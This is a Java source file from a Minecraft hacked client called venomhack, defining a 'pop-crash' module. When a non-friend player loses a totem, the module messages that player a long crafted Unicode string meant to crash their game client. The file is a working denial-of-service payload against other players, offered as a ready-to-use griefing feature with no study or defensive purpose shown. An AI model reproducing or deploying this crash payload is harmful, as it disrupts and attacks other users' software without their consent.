package de.tyrannus.venomhack.modules.chat;

import de.tyrannus.venomhack.events.TotemPopEvent;
import de.tyrannus.venomhack.modules.Module;
import de.tyrannus.venomhack.utils.players.Friends;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.PlayerEntity;

public class PopCrash extends Module {
   public PopCrash() {
      super(Module.Categories.CHAT, "pop-crash", "Sends uni code in a msg when someone pops to crash them");
   }

   @EventHandler
   private void onPop(TotemPopEvent event) {
      if (event.getPops() <= 1) {
         Entity var3 = event.getEntity();
         if (var3 instanceof PlayerEntity player) {
            if (!Friends.isFriend(player)) {
               mc.player
                  .sendCommand(
                     "msg "
                        + player.getEntityName()
                        + " āȁ́Ёԁ\u0601܁ࠁँਁଁก༁ခᄁሁጁᐁᔁᘁᜁ᠁ᤁᨁᬁᰁᴁḁἁ ℁∁⌁␁━✁⠁⤁⨁⬁Ⰱⴁ⸁⼁、\u3101㈁㌁㐁㔁㘁㜁㠁㤁㨁㬁㰁㴁㸁㼁䀁䄁䈁䌁䐁䔁䘁䜁䠁䤁䨁䬁䰁䴁丁企倁儁刁匁吁唁嘁圁堁夁威嬁封崁币弁态愁戁持搁攁昁朁栁椁樁欁氁洁渁漁瀁焁爁猁琁甁瘁省码礁稁笁簁紁縁缁老脁舁茁萁蔁蘁蜁蠁褁訁"
                  );
            }
         }
      }
   }
}
